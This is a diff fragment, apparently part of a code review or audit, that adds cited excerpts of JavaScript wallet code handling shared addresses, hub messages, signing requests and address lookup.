+		[arrMemberAddresses, arrMemberAddresses],
+		function(rows){
+		//	handleResult(rows.length === arrMyMemberAddresses.length ? null : "Some of my member addresses not found");
+			if (rows.length === 0)
+				return handleResult("I am not a member of this shared address");
+			var arrMyMemberAddresses = rows.filter(function(row){ return (row.type === 'my'); }).map(function(row){ return row.address; });
+			// rewrite device address for my addresses
+			if (!bHasMyDeviceAddress){
+				for (var signing_path in assocSignersByPath){
+					var signerInfo = assocSignersByPath[signing_path];
+					if (signerInfo.address && arrMyMemberAddresses.indexOf(signerInfo.address) >= 0)
+						signerInfo.device_address = device.getMyDeviceAddress();
+				}
+			}
+			handleResult();
+		}
+	);
+}
+```
+
+**File:** wallet_defined_by_addresses.js (L338-360)
+```javascript
+// {address: "BASE32", definition: [...], signers: {...}}
+function handleNewSharedAddress(body, callbacks){
+	if (!ValidationUtils.isArrayOfLength(body.definition, 2))
+		return callbacks.ifError("invalid definition");
+	if (typeof body.signers !== "object" || Object.keys(body.signers).length === 0)
+		return callbacks.ifError("invalid signers");
+	if (body.address !== objectHash.getChash160(body.definition))
+		return callbacks.ifError("definition doesn't match its c-hash");
+	for (var signing_path in body.signers){
+		var signerInfo = body.signers[signing_path];
+		if (signerInfo.address && signerInfo.address !== 'secret' && !ValidationUtils.isValidAddress(signerInfo.address))
+			return callbacks.ifError("invalid member address: "+signerInfo.address);
+	}
+	determineIfIncludesMeAndRewriteDeviceAddress(body.signers, function(err){
+		if (err)
+			return callbacks.ifError(err);
+		validateAddressDefinition(body.definition, function(err){
+			if (err)
+				return callbacks.ifError(err);
+			addNewSharedAddress(body.address, body.definition, body.signers, body.forwarded, callbacks.ifOk);
+		});
+	});
+}
+```
+
+**File:** wallet.js (L60-77)
+```javascript
+function handleMessageFromHub(ws, json, device_pubkey, bIndirectCorrespondent, callbacks){
+	// serialize all messages from hub
+	mutex.lock(["from_hub"], function(unlock){
+		var oldcb = callbacks;
+		callbacks = {
+			ifOk: function(){oldcb.ifOk(); unlock();},
+			ifError: function(err){oldcb.ifError(err); unlock();}
+		};
+
+		var subject = json.subject;
+		var body = json.body;
+		if (!subject || typeof body == "undefined")
+			return callbacks.ifError("no subject or body");
+		//if (bIndirectCorrespondent && ["cancel_new_wallet", "my_xpubkey", "new_wallet_address"].indexOf(subject) === -1)
+		//    return callbacks.ifError("you're indirect correspondent, cannot trust "+subject+" from you");
+		var from_address = objectHash.getDeviceAddress(device_pubkey);
+		
+		switch (subject){
+```
+
+**File:** wallet.js (L212-220)
+```javascript
+			case "new_shared_address":
+				// {address: "BASE32", definition: [...], signers: {...}}
+				walletDefinedByAddresses.handleNewSharedAddress(body, {
+					ifError: callbacks.ifError,
+					ifOk: function(){
+						callbacks.ifOk();
+						eventBus.emit('maybe_new_transactions');
+					}
+				});
+```
+
+**File:** wallet.js (L227-295)
+```javascript
+			case "sign":
+				// {address: "BASE32", signing_path: "r.1.2.3", unsigned_unit: {...}}
+				if (!ValidationUtils.isValidAddress(body.address))
+					return callbacks.ifError("no address or bad address");
+				if (!ValidationUtils.isNonemptyString(body.signing_path) || body.signing_path.charAt(0) !== 'r')
+					return callbacks.ifError("bad signing path");
+				var objUnit = body.unsigned_unit;
+				if (typeof objUnit !== "object")
+					return callbacks.ifError("no unsigned unit");
+				if (!ValidationUtils.isNonemptyArray(objUnit.authors))
+					return callbacks.ifError("no authors array");
+				var bJsonBased = (objUnit.version !== constants.versionWithoutTimestamp);
+				// replace all existing signatures with placeholders so that signing requests sent to us on different stages of signing become identical,
+				// hence the hashes of such unsigned units are also identical
+				objUnit.authors.forEach(function(author){
+					var authentifiers = author.authentifiers;
+					for (var path in authentifiers)
+						authentifiers[path] = authentifiers[path].replace(/./, '-'); 
+				});
+				var assocPrivatePayloads = body.private_payloads;
+				if ("private_payloads" in body){
+					if (typeof assocPrivatePayloads !== "object" || !assocPrivatePayloads)
+						return callbacks.ifError("bad private payloads");
+					for (var payload_hash in assocPrivatePayloads){
+						var payload = assocPrivatePayloads[payload_hash];
+						var hidden_payload = _.cloneDeep(payload);
+						if (payload.denomination) // indivisible asset.  In this case, payload hash is calculated based on output_hash rather than address and blinding
+							hidden_payload.outputs.forEach(function(o){
+								delete o.address;
+								delete o.blinding;
+							});
+						try {
+							var calculated_payload_hash = objectHash.getBase64Hash(hidden_payload, bJsonBased);
+						}
+						catch (e) {
+							return callbacks.ifError("hidden payload hash failed: " + e.toString());
+						}
+						if (payload_hash !== calculated_payload_hash)
+							return callbacks.ifError("private payload hash does not match");
+						if (!ValidationUtils.isNonemptyArray(objUnit.messages))
+							return callbacks.ifError("no messages in unsigned unit");
+						if (objUnit.messages.filter(function(objMessage){ return (objMessage.payload_hash === payload_hash); }).length !== 1)
+							return callbacks.ifError("no such payload hash in the messages");
+					}
+				}
+				if (objUnit.messages){
+					var arrMessages = objUnit.messages;
+					if (!Array.isArray(arrMessages))
+						return callbacks.ifError("bad type of messages");
+					for (var i=0; i<arrMessages.length; i++){
+						if (arrMessages[i].payload === undefined)
+							continue;
+						try {
+							var calculated_payload_hash = objectHash.getBase64Hash(arrMessages[i].payload, bJsonBased);
+						}
+						catch (e) {
+							return callbacks.ifError("payload hash failed: " + e.toString());
+						}
+						if (arrMessages[i].payload_hash !== calculated_payload_hash)
+							return callbacks.ifError("payload hash does not match");
+					}
+				}
+				else if (objUnit.signed_message){
+					// ok
+				}
+				else
+					return callbacks.ifError("neither messages nor signed_message");
+				// findAddress handles both types of addresses
+				findAddress(body.address, body.signing_path, {
+```
+
+**File:** wallet.js (L352-353)
+```javascript
+						// forward the offer to the actual signer
+						device.sendMessageToDevice(device_address, subject, body);
+```
+
+**File:** wallet.js (L1027-1096)
+```javascript
+function findAddress(address, signing_path, callbacks, fallback_remote_device_address){
+	db.query(
+		"SELECT wallet, account, is_change, address_index, full_approval_date, device_address \n\
+		FROM my_addresses JOIN wallets USING(wallet) JOIN wallet_signing_paths USING(wallet) \n\
+		WHERE address=? AND signing_path=?",
+		[address, signing_path],
+		function(rows){
+			if (rows.length > 1)
+				throw Error("more than 1 address found");
+			if (rows.length === 1){
+				var row = rows[0];
+				if (!row.full_approval_date)
+					return callbacks.ifError("wallet of address "+address+" not approved");
+				if (row.device_address !== device.getMyDeviceAddress())
+					return callbacks.ifRemote(row.device_address);
+				var objAddress = {
+					address: address,
+					wallet: row.wallet,
+					account: row.account,
+					is_change: row.is_change,
+					address_index: row.address_index
+				};
+				callbacks.ifLocal(objAddress);
+				return;
+			}
+			db.query(
+			//	"SELECT address, device_address, member_signing_path FROM shared_address_signing_paths WHERE shared_address=? AND signing_path=?", 
+				// look for a prefix of the requested signing_path
+				"SELECT address, device_address, signing_path FROM shared_address_signing_paths \n\
+				WHERE shared_address=? AND signing_path=SUBSTR(?, 1, LENGTH(signing_path))", 
+				[address, signing_path],
+				function(sa_rows){
+					if (sa_rows.length > 1)
+						throw Error("more than 1 member address found for shared address "+address+" and signing path "+signing_path);
+					if (sa_rows.length === 1) {
+						var objSharedAddress = sa_rows[0];
+						var relative_signing_path = 'r' + signing_path.substr(objSharedAddress.signing_path.length);
+						var bLocal = (objSharedAddress.device_address === device.getMyDeviceAddress()); // local keys
+						if (objSharedAddress.address === '') {
+							return callbacks.ifMerkle(bLocal);
+						} else if(objSharedAddress.address === 'secret') {
+							return callbacks.ifSecret();
+						}
+						return findAddress(objSharedAddress.address, relative_signing_path, callbacks, bLocal ? null : objSharedAddress.device_address);
+					}
+					db.query(
+						"SELECT device_address, signing_paths FROM peer_addresses WHERE address=?", 
+						[address],
+						function(pa_rows) {
+							var candidate_addresses = [];
+							for (var i = 0; i < pa_rows.length; i++) {
+								var row = pa_rows[i];
+								JSON.parse(row.signing_paths).forEach(function(signing_path_candidate){
+									if (signing_path_candidate === signing_path)
+										candidate_addresses.push(row.device_address);
+								});
+							}
+							if (candidate_addresses.length > 1)
+								throw Error("more than 1 candidate device address found for peer address "+address+" and signing path "+signing_path);
+							if (candidate_addresses.length == 1)
+								return callbacks.ifRemote(candidate_addresses[0]);
+							if (fallback_remote_device_address)
+								return callbacks.ifRemote(fallback_remote_device_address);
+							return callbacks.ifUnknownAddress();
+						}
+					);
+				}
+			);
+		}
+	);
+```
+
+**File:** device.js (L702-704)
+```javascript
+function sendMessageToDevice(device_address, subject, body, callbacks, conn){
+	if (!device_address)
+		throw Error("empty device address");
 ```
